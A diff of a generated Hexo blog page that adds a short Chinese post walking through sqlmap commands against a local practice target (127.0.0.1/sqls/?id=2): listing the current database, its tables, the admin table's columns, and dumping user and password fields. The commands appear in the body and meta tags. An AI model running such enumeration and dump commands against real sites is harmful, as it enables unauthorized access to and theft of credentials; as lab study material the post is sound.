@@ -7,13 +7,15 @@
   
   <title>SQLlow等级工具注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="article">
+  <meta name="description" content="SQLMAP利用方式：1.先去拿取这个网站的数据库python sqlmap.py -u “http:&#x2F;&#x2F;127.0.0.1&#x2F;sqls&#x2F;?id&#x3D;2&quot; –current -db                            –得到当前数据库：sqltext2.再拿取这个网站数据库的数据表python sqlmap.py -u “http:&#x2F;&#x2F;127.0.0.1&#x2F;sqls&#x2F;?id&#x3D;2">
+<meta property="og:type" content="article">
 <meta property="og:title" content="SQLlow等级工具注入">
 <meta property="og:url" content="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQLMAP利用方式：1.先去拿取这个网站的数据库python sqlmap.py -u “http:&#x2F;&#x2F;127.0.0.1&#x2F;sqls&#x2F;?id&#x3D;2&quot; –current -db                            –得到当前数据库：sqltext2.再拿取这个网站数据库的数据表python sqlmap.py -u “http:&#x2F;&#x2F;127.0.0.1&#x2F;sqls&#x2F;?id&#x3D;2">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-08-27T12:28:19.000Z">
-<meta property="article:modified_time" content="2020-08-27T12:28:19.732Z">
+<meta property="article:modified_time" content="2020-08-27T12:48:11.068Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -86,7 +88,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>SQLMAP利用方式：<br>1.先去拿取这个网站的数据库<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> –current -db                            –得到当前数据库：sqltext<br>2.再拿取这个网站数据库的数据表<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext –tables                     –得到当前数据库中的数据表：admin、sqltext<br>3.然后再获取这张数据表中的数据列<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext -T admin –columns           –得到当前数据库中的数据表中的数据列：id、user、pwd<br>4.最后得到相应的数据<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqls/?id=2&quot;">http://127.0.0.1/sqls/?id=2&quot;</a> -D sqltext -T admin -C uesr,pwd –dump </p>
+
       
     </div>
     <footer class="article-footer">
